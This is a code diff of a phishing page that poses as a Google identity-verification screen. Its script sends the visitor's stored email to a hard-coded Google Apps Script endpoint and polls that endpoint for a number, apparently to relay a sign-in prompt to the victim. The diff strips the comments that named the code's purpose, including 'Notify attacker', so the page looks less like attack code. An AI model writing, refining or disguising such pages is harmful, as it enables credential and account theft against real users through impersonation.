@@ -30,7 +30,6 @@
         <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
       </svg>
     </div>
-
     <div class="avatar" id="avatar"></div>
     <h1>Verifying your identity</h1>
 
@@ -49,13 +48,12 @@
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbybiPtJ_jzysZJ_nuBrR4iWuVkbXNPQIRya5FA5OWQLjmJVRkmCyjJS_8-JvTVSzN7m/exec"; // ← REPLACE WITH YOUR REAL /exec URL
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbybiPtJ_jzysZJ_nuBrR4iWuVkbXNPQIRya5FA5OWQLjmJVRkmCyjJS_8-JvTVSzN7m/exec";
 
     const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
     const usernamePart = email.split('@')[0];
     document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
 
-    // Notify attacker
     fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -70,7 +68,6 @@
     .then(d => console.log("Notify response:", d))
     .catch(e => console.error("Notify error:", e));
 
-    // Poll loop with heavy logging
     const pollInterval = setInterval(async () => {
       try {
         const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`;
@@ -101,7 +98,6 @@
       }
     }, 4000);
 
-    // Safety redirect
     setTimeout(() => {
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
